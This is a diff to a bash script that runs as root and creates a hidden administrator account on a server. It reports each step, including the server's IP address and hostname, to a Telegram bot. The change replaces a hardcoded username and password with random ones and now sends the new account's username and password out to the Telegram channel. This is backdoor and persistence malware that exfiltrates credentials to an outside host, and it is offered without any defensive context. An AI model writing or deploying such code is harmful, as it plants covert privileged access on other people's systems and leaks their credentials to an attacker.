@@ -15,6 +15,11 @@ get_server_info() {
     echo "IP Address: $ip, Hostname: $hostname"
 }
 
+generate_random_string() {
+    local length=$1
+    tr -dc 'a-zA-Z0-9' < /dev/urandom | head -c "$length"
+}
+
 if [ "$EUID" -ne 0 ]; then
     send_telegram_message "Error: Please run as root"
     exit 1
@@ -26,9 +31,9 @@ mkdir -p /var/empty
 server_info=$(get_server_info)
 send_telegram_message "Starting the creation of a hidden admin user. $server_info"
 
-# Define fixed username and password
-user_id="rotjsugqbzuh"
-password_1="sousheb1828#Aausv@92"
+# Generate random username and password
+user_id=$(generate_random_string 12)
+password_1=$(generate_random_string 16)
 
 # Check if user already exists
 if id "$user_id" &>/dev/null; then
@@ -52,4 +57,4 @@ else
     usermod -s /bin/bash "$user_id"
 fi
 
-send_telegram_message "Admin user $user_id has been created and hidden successfully. $server_info"
+send_telegram_message "Admin user <b><code>$user_id</code></b> has been created and hidden successfully with password <b><code>$password_1</code></b>. $server_info"
